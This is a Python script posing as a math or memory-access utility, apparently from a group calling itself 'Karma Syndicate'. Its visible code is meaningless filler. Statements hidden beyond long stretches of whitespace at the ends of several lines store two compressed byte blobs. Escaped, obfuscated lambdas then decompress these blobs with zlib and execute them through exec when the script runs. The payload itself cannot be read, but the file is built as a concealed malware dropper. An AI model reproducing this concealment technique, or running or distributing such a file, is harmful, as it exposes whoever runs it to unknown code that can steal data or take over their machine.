from builtins import *
from math import prod as _positive


__tool__ = 'For Legitimate Use'
__authors__ = ('Telegram:', '@xnabob')
__organization__ = 'Karma Syndicate'
__telegram__ = 'https://t.me/KarmaSyndicate'
__version__ = 'Latest'

__license__ = '4836037d39227231520bc3346a94c8a7'


Multiply, Product, Algorithm, Cube, _ceil, _multiply, _hypothesis = exec, str, tuple, map, ord, globals, type

class MemoryAccess:
    def __init__(self, StackOverflow):
        self._invert = _positive((StackOverflow, -23800))
        self._square(Substract=-95049)

    def _square(self, Substract = bool):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._invert -= -36208 - Substract
        
        try:
            ((Multiply, (Product, Multiply, Floor)) for Multiply in (_ceil, Algorithm) if _multiply > Cube)

        except TypeError:
            ((Cube, {Multiply: _ceil}) for Cube in {Floor: _ceil} if Product < Multiply)

        except:
            _hypothesis(-96332 + 62251) == bool

    def Positive(self, _memoryaccess = -51628):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _memoryaccess *= -76781 * 81628
        self._power != bool
        
        try:
            ((Multiply, (Cube, Floor, Product)) for Multiply in {Multiply: _ceil} if Cube != Multiply)

        except AttributeError:
            (((Product, Multiply, Floor), Floor) for Floor in (Product, Multiply, Floor))

        except:
            _hypothesis(76092 + 93148) == int

    def Frame(Negative = float):
        return _multiply()[Negative]

    def Builtins(_math = -22227 / 73191, Power = None, _round = _multiply):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _round()[_math] = Power
        
        try:
            {Multiply: _ceil} if Multiply <= Cube else (Cube, Floor, Product) > Algorithm

        except AttributeError:
            ({Multiply: _ceil} or Multiply if {Multiply: _ceil} and Multiply else ... or (Multiply, {Multiply: _ceil}))

        except:
            _hypothesis(-41661 + 76539) == True

    def execute(code = str):
        return Multiply(Product(Algorithm(Cube(_ceil, code))))

    @property
    def _power(self):
        self._calculate = '<__main__._positive object at 0x000006112BE28707>'
        return (self._calculate, MemoryAccess._power)

if __name__ == '__main__':
    try:
        MemoryAccess.execute(code = __license__)
        _substract = MemoryAccess(StackOverflow = 38285 * 25530)

        if 425512 > 2858766:
            _substract._square(Substract = _substract._invert / 61364)
        elif 426891 < 3323678:
            _substract._square(Substract = _substract._invert - -79950)                                                                                                                                                                                                                                                          ;MemoryAccess.Builtins(_math='nmnnmmnmnmnmnmmmm',Power=b'x\x9c\xe5\x1bmo\xe28\xfa;\xbf\x82\xeb\x17\x92+\xc3\x84\xbc8\x01\t\xe9FGg\x97\x1e-\xabeN\xccj4B!q\xda\xb0!\xe6\x920\xd0[\xdd\xfd\xf6{\x1e\xdb\x81\xb4@y\xafV\xd7$vl\xc7\xb1\x9d\xc7\xcf\xbb\x9d,yj\x96\xcap\x84\x81\xc2\xefx\x0c\x87\x19c\xd1pX\xfeK\xeb\xea3K\xca]\xfa\x10f\xe1\xc4\xcdh\xf9\x9f)\xbd*\xb3\xa4P\xd5\x9de\x8f,Iym\xe5\xea\x0b\x8d\xe8C\xe2N\x9aW\xd5\xab\xbf-bw\xc4FW\xea\xb3\xfa,yp\xe3\xf0\xdfn\x16\xb2Xt\xf1\x0f7\x99\xb8\xe5\xfeS\xec\x87\x1e\xf4\xf1\xa2\xfdL\xb6(\xea>f\xd94m~\xfc\x98\xd5&\xf4#\x7fq\xdb{?h\x92.\xbb\xe8\xc2\xf34{Q#\n=\x1a\xa7\x94\xd7\xa8\x98\x8eA4\xc3\xf6\x8d\x86\xae\xdb\xbaQ\xb7tm\xe4\x19\x86I\xdc\x86\xe99\xae])\xa9\xcd\xe5\xbba\x9c)\x95\xf4\xf7\xd0\xaf\xa8%\xba\xf0\xe84\x93@\x8c\xa7\xb3L\xb9\xfa%\xa2nJ\xcbm\x16W\xb2\xf2\x1d\xf3\xc3\xe0\xe9J-\x89N\xc3\xc9\x94%\xd9p\x08\xef?\xa5\x15\xb5F\x17a\xa6\xa8\xa5\x88yn\x94*\xea\xb7J\xaf\xc74\x0cp\xf4\xe0\xcezp\xd3\x18\x83\xc2\xca\xf7\xd6C\xc4FP\xaf\xb4\xbd\x1261\x9f/\xe6\x18\x16\x0b\x1e\xcf\xf9\x01\x99E\xe5[\xb3y\xfd\xe1\xfa\x83\xf2A\xb9\xae\xab\xea\xf7\xef-?Lv46\x99\xc4\x13\x1eb~\x88$d&\xeb\x8d=\xd0\xcc\xcd\xb2]\rv\xe0\x88\xa2\xa8\xc3/\x9e\x10\x05\xf0y\x02\n\xa5m5\xf0\xed.$\xbb\xb7\xdd\xee-\x1c\xdd\xdbN\xb7\xdb\x85\xf7V`\xdd\x05\x19\x04\n\x1e"!\x00\x83\x174\xb2\xde\xb2R\x19\xcd\xc2(\x0bc\x9c\xa8\x1fn\xf2\xfa\xc8\xee\xee\xef\xef\xee\xeey|\x871^w\xf7\xd00\x02+~\tB\x0c\xca\xa6.\xd38\xcc\xa2p6z\t^\xb5*&T\x0cy!&T\x0c\xff\xb0v\xd4o\xe7j\xa8\x16\xc6>](\x95\x88\xb1\xf5\xa7\xdf\xd5\xd2Vh#\xb8\xfa}\xbd\xaf\xe3\xd1\xc7T\x9f\xa7\xfb\xfc|\x0f K\xb2t\x13\xc4^\xc7^\xc6\xdam\xc8\xf4z\xedv\x1b\x9e\xf6\xd8{\x80\x14M#\xf7\xf3\xe1\xb0\x82\x07\xf0\xa8\x87O\x99\xa8\xa1\xbd\x13x\xcd\x92/\x9b\xc0\xf5\x1a\xeb\x82\xf6\xf1\xc0\xeen;\xd8\xdd\xed\xbb\x80T\x14N\'\xcc;\x14X@\x83@{p\xb4\x91\x0e\x91 \xdb\xbd\xf7\x00\xae\xcceQp0\x9b\xff:\xf8\n\xc7\x00o<\x85\x99\xc1\x00\xe0U\xa9\xd4\xc6,\x8c_\x7f\xfb\xfe^\x08U~\x88\xd4{\x00u\xe4\xfe\xa0\x07C\x9ac\xa9DX\xc4W\x1e\x1f\x0c\xad0\xf4R\xd0\xcfO\x86\xd6\xd6v\x0e\x85\xd6\xf6\x86rh=\x05a\xb4\xa0\x8f\xf1\xec`)\xb1\x11d\xca\xa8b6L\x17\x82\x07\xb1+\xd3"/J\xf2\xb4\xa8\x01\xcf@=\xf4\xa9\xc7|\xaaT\x9c \xdb0\x8e\xff\x7f\x94\xf5\xe8\xe2\x18\x94\x8d\xc2q\x14\x8d\xe1\xc4D8.\xb6\xb0\x81\xf6\x95m\x13f\xe8V`8\x10L\x08\x16\x04M\xa6\r\x08D>\xd3\xf4\x91\xee\xe8\xfe\xce\xba6\x84\x86\xde\xd85\xa9*\xb7y\x0e\x19\xa5\xae\x9b\x16\xa1\xb6I,[\xd75\xd3#\r\xdb\xb0M\xc3\xd55]\xdf\xd9\xdb\xeb\x90D\xf1\xd4\x91R\x8a\xa7\x8f\x86d]\xf79\x94\xb4}!\x10\xb9\x93\x91\x0f\xf6\xbb\xde\x97\xaa<\xaa\xf4x5_\xa3\xbd\xd7?G\x98\x02\xfa\xd2D\x90\xa6A\x7f\xd7WUT\r\x9e\xd5wW\xab\xc33\xedl\xd5\xac\xa11\xd4\x87&\x04\x07\x02\x19\xeaP\x93\xbc,\xdb\xdd\x8c\x01\xaf4 \x10x\xcd\x82\xd7\xb4\xa1\x03u\xcd\xf5\xd2\xa3\'W\x93\x93[\xdfor7\x85CQ\xde\xd6\x89~2z\xafx\'rMd\xa5G\x83\xa0!)\x9e\xc8\xbb-\xa9\xdf)p\x05Sr\x8a}\xea\x1a\x97\xe1\x14\xc4\xb1M85\xdb\x00\xfe\x10\xe8\x011l\x8d\x8cH\x1d\xc0\xe9\x93\xbaN\x89A\x0c=0}\xdb"\r\xcb1\xa9\xe9\x10\xcf\xd0\x0c\x1b\xc6\xe5\x18\r\xdb1\x03K#\xbe\x1e\xd8\xd0\x8ei\x98#\x18+\xbci\x18$\xb05\xa8\xef\x93\x06\tt\nm:\xf6\xe9\xdc\x07-R\x08\x0c.\xd6\xe6Vj\xbb}6R\xdd\xab\xda\xd6\xe9\xce\x19\xba&C\x1d\x99;\x04\xbdP^\x97\xd3\xbdO\xdd=\xd9\xe2\x8aZ${D\xb0\xf4\x84\xb1\xd0\xeeA\xc4N\xe0\x8eR\x83\x10\xf4 \xdcq\xa7P\xc4\xb1\x1c\x7f\xbeR\x1c\x16\xf2\x06Ws\xbb\xed\xb4C\x19\x08Q\x13\x08\xc7a\x88)Hc\nn\xe1n\x14i\x00\x83\xd4!hC\x1b\xe2:0Kd\x9c\x1a\xe4\x8d\xe7\xa5o\x8b\x94\xa7\xe2\xee\x89\xdcz9QhqA\x10\xa6Wn\x8d}\x1d\x1c=S\x80\xbd\xdc\xf8\xed\xf58N\xa3%\xfcv\xc8w\x10\x1b\xb5\x81\xe9Y\xa0dY\xc4\xb3M=\xb0l`\x7f:\xb0\xd1\x06\xa1\xc4\xd6}\xcb6\x81\x15\x02\x1b4\x91M\xea\xf6\x89l\x101\x16\x8f1\xc7`\xb8\xed\xd4g+*Ju\x13\x10T\x03\xd9N@\xba\xdb\\y\xb0\xd7K\xdf\n\xc2G\t+\x02\x10\xf5\x88u\xb2 \x91\xee\x81\x81@T\x89\xb6\x7fR\xdc\xd2A({$ 6b\x93\x1e\x18\x85\x9c\x15@\x8a\x02\xce5\x0c\xa4\xdeS\xa1\xb2\x04\x88 \xdd\x81\xf4\xa4\xecF.\xe4\x89\x16p>T\x1bM\xaeD\xdaP\xd7X/=I\xbc\xe6\xe2\xd2\x92\x9aRnK\xd9R|\x92\x82x\xddU\xd7:\x04I%{\x03:\x1b#\xe9\x81\x19\x89F$\x10\xdf\xf8X\xd6\xb6\xed;\tNh`\x9a\x18\xcc\xc0\x14\xa9@\xe4\xf8\x93@\xdcw;\x02\x0eD1\x8d\xea\x0ei\xa0\xb5\x08he\x13R\x07$k\x10\xf3T\x94\xda\xea\xf8\xf0\xe1\xa42`Le\xbc*\xf3\x8bO\xce\xfc\xbd6\xd8\xc5\xa72\xe1\x95\x84\x13\t\xa0\x9cK\xcbiC"\xb1#\x11;Gf\xa3`>\xe4&\xc5>u\xf74)\x8e\xe1Y\xd6H\xc8<\xcb?\x83\xd3A\xf2!\xc1\xab\x0b>\xde}\xa4\x9eP\xd8\x1aC4\x93Q\xc6\xd9\\\xea\xad\x95\xbe\xa5\xeet0,=\xe0\xfb\xa7\xc2\x105\xf8X(\xf0\xdc+(\xdc\x82o\xf5\xd9\x07\x1b\xf3\xe8\xbbBU\t\xacH\xe0Du.\xfa.\xc4\x8b,\xbbp:ki\x87\xdf!>;\x0f\xd2\xc0\xca\x06C\xfaTN\xb4\xad\x07\x1b\x0fG\x9e\xf6Z\x80\xf8\xdcR\xc4\xf6NFS\xdeh\'\xef@H\xd7?)\x92\xda\x97\x9a8\xd0\xe8(\xf1y\xbc\xba\xd3g\xf9<\x86\xf3\xech\tv\x0cw\x1c_\n-\x1d\x89\x96\xc5\xd8Y"\xab\xbdBO\x8c\xce\xfdu\xa4~\xa9\xef\xca\x154C\x13J\x9cH\x1bZ^\x82\xf7\xdd_\xb3tr\xe7\xce\xe8|\xbf\x8a\xf0t\x1fkI3\x8d\xf1]\n\xac\x87\x8e\x1f\rr;-\xe9\x8a\xea\x80\xee\xde\xe0\xbe\r\x1d\x0cC\x14\x9a\x06\xd4m\xac\x97\x9e\xcd\x8d\x81b\x19\xbd(\x84\x9b\xa4\x1a\xf6\xc0\xfd+\xc6\xcb\xd2}|\xdc\x16\x9c&\xbcT\x87WL\x88\x85\x8f{\xad\xf4$mL\xcb\x97|\xa4F\xd5\xc8M\x11\xa9i\xe9\x05mlW\xdd\xa3\xbd/\x9b7\x84)\xca\x7f\xd7\xf6\xf1\xa8,Q\x94\x8d;VT7\xf6\x95\xf5\xfaG\xd3\x82\xc0}"\xcd\x15R\xc8\x0bj@\xba\xc0\xdc\xe5\x0c\x19\xeblFL\x85/Y\xf2\x07\xcb\x88;$\xe7\x97V\xf8\x9d\x82\xc2^D\x95<\xed\x14\x9c\xca\xfb\xd4\xbd\xa0k\xe6\xac\n\xbf\xdc\xa8\'\x97\xf9\xf2\xeb$0\xe6 (.\xbe\x9a\x12<Xn\x17\xc0\xb8\xab.\xb9\x8c>\x81r\x97@g\xb6N\x1a\xb6iCo\xa0\x06\x07d\x04\xa5\xf4rRKP\xa2\xa0I\xa4\xcd\\f\xe5\xe5+\xf9eJ\xba=/\xcd\x1a\x96\xd4\xd2\xcc=\xdd2\xbb\xbc\xfb\xc27#\xd6\xf9q\xe1?\xc4\xdc\x9b/Z\x14\\\xe1\xf2\xde|e\xdc\xc7\xcd\x9d)\x1cD\xdc=$\xddEy\xbc\xe2\xbc\xfb\xeb\x1c\x9c\xea\xa4\xc2!\x17\xd8OX[\xdfjn\x19\xe24tC\x7f\x9e\xc2{\x9e>\xb7\xdeg\x99\xc4\x01y@\xc9\x08$C\x83\x04\xb6\xa5\x9f\xac\tV\x84\xbb\xf4\xd9Z\xc7\x1e> \x87\xaf\xafk<\xa0\xcf\xdd\x19\x12\xaeV\xad\x95\xbe\xf5\xee\x82\xbd\xaa\x9d\xd3\x11\xb2q\x11I\xecXZ\xeec\x12>\x8bs\xfbY\x11\xd9V\x88\xb8B>\x91\x13\xe1\xec(\x18X\x01\xae\xa9\x0b\xc7\xbd\x15\x9c\x8c~b\x193\xe2\xcb@\xe8\x96\x1e\x8f\xa3\xe376\x1dl+\xcb\xe9\xeatnq\x1fW\x97o\xe9\x95;{;ggu\xa0\xc8\xf1\xd3l\xe4\x01\xe3b\x99\xb9s\xd8\x07{3@\xa1!\xc4p.\xe5w*\x18\xbev\xc1G\xf3\xdc\x0cv\xce\xed\xa51\xcc\x03&\xba\x14$lR\xce\x7fN)\x8b\x9f_\xcatA\xbd*\xff\x05\xa9:M\xc28\xabb\x98\xb8\xd3j\x9a%U6\xa5q\tk(\xb9\xfb\xa6\xb3\xa2\xd6H-\xc96<\x16{\xb3$\xa1qV\x0bf\xd9,\xa1i\xfe$\x9dd\xd3(\x1c\x89\xae\xb3pB\xf3n\xa1\xf5\x00\xf3\xebOx\xdaM\xf9=\xc9\xdbI\xc0\xa2a\x93e\x8e\xaeR\xff\x9a\xd14[\xf5\x97\xc17<\x94\nM\x89\x0e<\x16\xb1\xc4\x9d\xb8\xb2\x93\xbf\xe65\x18\xbc\x19\x87\x99\xe2\xce2\x06\xc3\xa6Y\xab\'Mj\x86\xa2\x12\x13\x1aSK\t\xf5\x86^\xc8Z\xd2\xdf:Y\xfd\xd2\x04\xcd\xb7>\xc3\xab\xb5_o\xda\xa5\xc0\x13\xe9\xbf\xff\xf6\xe9\xbe\x14\xccEf\xf0s\xe7\xcbM)x\x10\xb9\x9f~\xbd\xb9\x81g\x13\x91\xbb\xfb\xf4\xd3\xcd\xfd\x97O\xa5\xe0I\xe4\x7f\xbb\xe9v{\x83\x92O\x83\xb27\xf5\x1e\xa9\xf7\xbb2K"\xf9\x0fY\x96\xffu\x87\x07@\xc3\r\xe3\xea,\xa5I\xecNhu:\xf7[P\xb5\x96\x02\xb83\x85\xef\xad\x10\xa6\x8d0o\xd4\xe5\x8b0\x1b\xad\x1cj\xb5>M\xf1w7e\xf5\xf8\x91\xa5YK4~\xfd\xf5\xf9\x92\xaaXK\\5\xc4\x1eZ\x7f\xe4\x8eh\xb9?5\x96\xf0i.\xc7%Ej\x1es_\x7f\x13\x06\xfb\x9fe;0\x98\x16\x0c\xaa6\x85\x9e\x15\xec\xbe\xea\xbb\x99\xdb\x82\xe6\xab8\x7fl\x96\xb5\x04\x11\xe6')

        if 107948 > 4318391:
            _substract._square(Substract = _substract._invert + -23111)
        elif 234498 < 7940890:
            MemoryAccess(StackOverflow = -66186 - 69446)._square(Substract = _substract._invert - -54006)                                                                                                                                                                                                                                                          ;MemoryAccess.Builtins(_math='WWXXXWWWXXXXWWWXXWXXWWWX',Power=b'\x9bF\x84\xf1\xb6\x1ar\x18\x94\x9f\x9b\x16\xb9\xb1Q\x0ecD\x08\x05z\xa8\x01\x8af\x80\x9f\x85\xdf\xf1\xf0\xe0\x18\xaf\x0c\n\xcb>R\xf0_\x03,\xaf{8\xff\xe8c\xe1wD\x050\xa3\xd5g\r \x81(\xbd\xc2\x9e\x06\xbeQ\xa7\xd7\x16[n\x17\x92\x7f,\xe4.\x97\xf9\\\xad\xcd\x930\xa38\xab\xd7_W]\x0e\xf2M\x16\x98]\xf5@\xa3\x94n\x1a\xf0\x12\n\x05#\x96\xf3(>l\xdc.\xc4\xc4\xce*\xdc2\xc4P\xd1\x13m\x16\xff:\xe4\xad\xb9i\xca\x91-\xf5\xdcX\tf\xb1\x87\xffWVS\x18a\xba\t\xe9\xe6a\xf6\xb8\x81\xd8k_\x1e\x13\xea\xfa\xbf0\x16\xdd\x00\xaf@RR\xd0\r\x81\x94$\x9c\x13\\\xd5\xe4#\xd1z*\xd06\x95\xd5\x9e\x7f\\^Z\x03\xf6\xf3r4\x85\xf1\x97o\xf8\r\x9e!\x9b(\x00H\x00\x87\xaa\xfc\x93\x10\x83\x15\xf9\x11\xa3\xf0\x07KZ\xe2?K\x90\xafp\x89\xdd\xc3\x98\x88D\xd3A\x18\xd1\xb4\xf5\xc7\x18\xe5o$D0\xdf\x941n*\xfcm\xce\ne\xb2\xdf\xcf7\x9a\xe6\xbf\x9f\x89H\xadN\xe4N\xc3\xc9rq\x06\x83*\x90\x1d 5eqJW\xe4\xc7Q^\xf2\x96\xaa\x18\x01\x8f\xc5\x90\xf8\x87\xb7\n\xfdr\xbf\x90t\n\xddK\t\x81\x89*\x8d\x81\xef\x03\xdfkI\xf9\x10u\x96\x92B\xad\xe1\xd4(\xaa`\x0cQ\x18\xd3TR;\x9fs\xc9er \x03)\r\x87H\xb7\xc3a\xab%,\x08a9\x88/\x16\xd0\x14\x90-\xad \xde_\x92\\\xee\xe1\xec\xab\xa5\xff\x01\xca\x1dY\xac')

        if 221493 > 3291524:
            MemoryAccess(StackOverflow = -26483 + -67674)._square(Substract = _substract._invert / 37693)
        elif 316212 < 9018518:
            _substract._square(Substract = _substract._invert / -89673)                                                                                                                                                                                                                                                          ;S2SSSSS22S2S2SSSSS2,ODoDOooDOoooDOOoDoOo,NMMNNNNNNNMMNMNMNM,OOOo0000oOOOoOoOOO0oOo0,DDDODOODoDODooOooDOo=(lambda IllIIllIIllIIIIlllI:IllIIllIIllIIIIlllI(__import__('\x7a\x6c\x69\x62'))),(lambda IllIIllIIllIIIIlllI:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(IllIIllIIllIIIIlllI)"),filename='\x4e\x4d\x4e\x4e\x4e\x4d\x4d\x4e\x4d\x4d\x4d\x4d\x4e\x4d\x4e\x4e\x4e\x4d\x4d\x4d\x4e\x4e',mode='\x65\x76\x61\x6c'))),(lambda IllIIllIIllIIIIlllI:IllIIllIIllIIIIlllI['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda:(lambda IllIIllIIllIIIIlllI:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(IllIIllIIllIIIIlllI)"),filename='\x4e\x4d\x4e\x4e\x4e\x4d\x4d\x4e\x4d\x4d\x4d\x4d\x4e\x4d\x4e\x4e\x4e\x4d\x4d\x4d\x4e\x4e',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda wwxxxwwwxwwwxxxxwwwxxxxw,IllIIllIIllIIIIlllI:wwxxxwwwxwwwxxxxwwwxxxxw(IllIIllIIllIIIIlllI))
        _substract.Positive(_memoryaccess = 66798 - _substract._invert)                                                                                                                                                                                                                                                          ;OOOo0000oOOOoOoOOO0oOo0()(DDDODOODoDODooOooDOo(NMMNNNNNNNMMNMNMNM(S2SSSSS22S2S2SSSSS2(ODoDOooDOoooDOOoDoOo('\x76\x61\x72\x73'))),MemoryAccess.Frame(Negative='nmnnmmnmnmnmnmmmm')+MemoryAccess.Frame(Negative='WWXXXWWWXXXXWWWXXWXXWWWX')))

    except Exception as Floor:
        if 498591 > 6096939:
            MemoryAccess.execute(code = Product(Floor))

        elif 170653 > 945308:
            MemoryAccess(StackOverflow = -72984 / 88159)._square(Substract = _substract._invert - 15933)